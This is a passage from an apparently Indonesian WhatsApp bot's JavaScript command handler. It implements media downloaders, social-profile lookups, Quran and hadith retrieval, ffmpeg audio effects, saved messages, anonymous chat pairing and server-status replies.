                    hisoka.sendMedia(m.chat, anu.caption.profile_hd, '', `│➳ Full Name : ${anu.caption.full_name}\n│➳ User Name : ${anu.caption.user_name}\n│➳ ID ${anu.caption.user_id}\n│➳ Followers : ${anu.caption.followers}\n│➳ Following : ${anu.caption.following}\n│➳ Bussines : ${anu.caption.bussines}\n│➳ Profesional : ${anu.caption.profesional}\n│➳ Verified : ${anu.caption.verified}\n│➳ Private : ${anu.caption.private}\n│➳ Bio : ${anu.caption.biography}\n│➳ Bio Url : ${anu.caption.bio_url}`, m)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'npm') {
                    if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/npm', { query: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`│➳ Name : ${anu.name}\n│➳ Version : ${Object.keys(anu.versions)}\n│➳ Created : ${tanggal(anu.time.created)}\n│➳ Modified : ${tanggal(anu.time.modified)}\n│➳ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n│➳ Description : ${anu.description}\n│➳ Homepage : ${anu.homepage}\n│➳ Keywords : ${anu.keywords}\n│➳ Author : ${anu.author.name}\n│➳ License : ${anu.license}\n│➳ Readme : ${anu.readme}`)
		    db.data.users[m.sender].limit -= 1
                } else {
                    m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                }
            }
            break
	        case 'tiktok': case 'tiktoknowm': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.nowatermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokwm': case 'tiktokwatermark': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.watermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokmp3': case 'tiktokaudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/musically', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1}
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
                hisoka.sendMessage(m.chat, { audio: { url: anu.result.audio }, mimetype: 'audio/mpeg'}, { quoted: msg })
            }
            break
	        case 'instagram': case 'ig': case 'igdl': {
                if (!text) throw 'No Query Url!'
                m.reply(mess.wait)
                if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instagram2', { url: isUrl(text)[0] }, 'apikey'))
                    for (let media of anu.data) hisoka.sendFileUrl(m.chat, media, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                } else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instastory', { url: isUrl(text)[0] }, 'apikey'))
                    hisoka.sendFileUrl(m.chat, anu.media[0].url, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                }
            }
            break
            case 'joox': case 'jooxdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'apikey'))
                let msg = await hisoka.sendImage(m.chat, anu.result.img, `│➳ Title : ${anu.result.lagu}\n│➳ Album : ${anu.result.album}\n│➳ Singer : ${anu.result.penyanyi}\n│➳ Publish : ${anu.result.publish}\n│➳ Lirik :\n${anu.result.lirik.result}`, m)
                hisoka.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'scdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await hisoka.sendImage(m.chat, anu.result.thumb, `│➳ Title : ${anu.result.title}\n│➳ Url : ${isUrl(text)[0]}`)
                hisoka.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
	        case 'twitdl': case 'twitter': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                let msg = await hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
                hisoka.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
                hisoka.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `│➳ Title : ${anu.result.title}`}, { quoted: m })
            }
            break
	        case 'pindl': case 'pinterestdl': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
                hisoka.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
            }
            break
            case 'umma': case 'ummadl': {
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
│➳ Title : ${anu.title}
│➳ Author : ${anu.author.name}
│➳ Like : ${anu.like}
│➳ Caption : ${anu.caption}
│➳ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: hisoka.user.name,
			buttons,
			headerType: 4
		    }
		    hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        hisoka.sendMessage(m.chat, { image: { url }, caption: `│➳ Title : ${anu.title}\n│➳ Author : ${anu.author.name}\n│➳ Like : ${anu.like}\n│➳ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		hisoka.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case 'iqra': {
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		hisoka.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		case 'juzamma': {
		if (args[0] === 'pdf') {
		m.reply(mess.wait)
		hisoka.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		m.reply(mess.wait)
		hisoka.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		m.reply(mess.wait)
		hisoka.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		m.reply(mess.wait)
		hisoka.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		m.reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break
		case 'hadis': case 'hadist': {
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		hisoka.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                hisoka.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
            if (!isCreator) return
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                hisoka.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                hisoka.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case 'anonymous': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                hisoka.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await hisoka.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, hisoka.user.name, m)
            }
			break
            case 'keluar': case 'leave': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await hisoka.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, hisoka.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, hisoka.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await hisoka.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, hisoka.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, hisoka.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await hisoka.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, hisoka.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await hisoka.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, hisoka.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, hisoka.user.name, m)
                }
                break
            }
            case 'public': {
                if (!isCreator) return
                hisoka.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break
            case 'self': {
                if (!isCreator) return
                hisoka.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break
            case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
            case 'speedtest': {
            m.reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
            case 'owner': case 'creator': {
                hisoka.sendContact(m.chat, global.owner, m)
            }
            break
            case 'playstore': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} clash of clans`
            let res = await fetchJson(api('zenz', '/webzone/playstore', { query: text }, 'apikey'))
            let teks = `│➳ Playstore Search From : ${text}\n\n`
            for (let i of res.result) {
            teks += `│➳ Name : ${i.name}\n`
            teks += `│➳ Link : ${i.link}\n`
            teks += `│➳ Developer : ${i.developer}\n`
            teks += `│➳ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
            }
            m.reply(teks)
            }
            break
            case 'gsmarena': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} samsung`
            let res = await fetchJson(api('zenz', '/webzone/gsmarena', { query: text }, 'apikey'))
            let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
let capt = `│➳ Title: ${judul}
│➳ Realease: ${rilis}
│➳ Size: ${ukuran}
│➳ Type: ${type}
│➳ Storage: ${storage}
│➳ Display: ${display}
│➳ Inchi: ${inchi}
│➳ Pixel: ${pixel}
│➳ Video Pixel: ${videoPixel}
│➳ Ram: ${ram}
│➳ Chipset: ${chipset}
│➳ Battery: ${batrai}
│➳ Battery Brand: ${merek_batre}
│➳ Detail: ${detail}`
            hisoka.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'jadwalbioskop': {
            if (!isCreator) return
            if (!text) throw `Example: ${prefix + command} jakarta`
            let res = await fetchJson(api('zenz', '/webzone/jadwalbioskop', { kota: text }, 'apikey'))
            let capt = `Jadwal Bioskop From : ${text}\n\n`
            for (let i of res.result){
            capt += `│➳ Title: ${i.title}\n`
            capt += `│➳ Thumbnail: ${i.thumb}\n`
            capt += `│➳ Url: ${i.url}\n\n──────────────────────\n`
            }
            hisoka.sendImage(m.chat, res.result[0].thumb, capt, m)
            }
            break
            case 'nowplayingbioskop': {
            if (!isCreator) return
            let res = await fetchJson(api('zenz', '/webzone/nowplayingbioskop', {}, 'apikey'))
            let capt = `Now Playing Bioskop\n\n`
            for (let i of res.result){
            capt += `│➳ Title: ${i.title}\n`
            capt += `│➳ Url: ${i.url}\n`
            capt += `│➳ Img Url: ${i.img}\n\n──────────────────────\n`
            }
            hisoka.sendImage(m.chat, res.result[0].img, capt, m)
            }
            break
            case 'aminio': {
            if (!isCreator) return
            if (!text) throw `Example: ${prefix + command} free fire`
            let res = await fetchJson(api('zenz', '/webzone/amino', { query: text }, 'apikey'))
            let capt = `Amino Search From : ${text}\n\n`
            for (let i of res.result){
            capt += `│➳ Community: ${i.community}\n`
            capt += `│➳ Community Link: ${i.community_link}\n`
            capt += `│➳ Thumbnail: ${i.community_thumb}\n`
            capt += `│➳ Description: ${i.community_desc}\n`
            capt += `│➳ Member Count: ${i.member_count}\n\n──────────────────────\n`
            }
            hisoka.sendImage(m.chat, 'https://'+res.result[0].community_thumb, capt, m)
            }
            break
            case 'wattpad': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/wattpad', { query: text }, 'apikey'))
            let { judul, dibaca, divote, bab, waktu, url, thumb, description } = res.result[0]
            let capt = `Wattpad From ${text}\n\n`
            capt += `│➳ Judul: ${judul}\n`
            capt += `│➳ Dibaca: ${dibaca}\n`
            capt += `│➳ Divote: ${divote}\n`
            capt += `│➳ Bab: ${bab}\n`
            capt += `│➳ Waktu: ${waktu}\n`
            capt += `│➳ Url: ${url}\n`
            capt += `│➳ Deskripsi: ${description}`
            hisoka.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'webtoons': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/webtoons', { query: text }, 'apikey'))
            let capt = `Webtoons Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `│➳ Judul: ${i.judul}\n`
            capt += `│➳ Like: ${i.like}\n`
            capt += `│➳ Creator: ${i.creator}\n`
            capt += `│➳ Genre: ${i.genre}\n`
            capt += `│➳ Url: ${i.url}\n\n──────────────────────\n`
            }
            m.reply(capt)
            }
            break
            case 'drakor': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/drakor', { query: text }, 'apikey'))
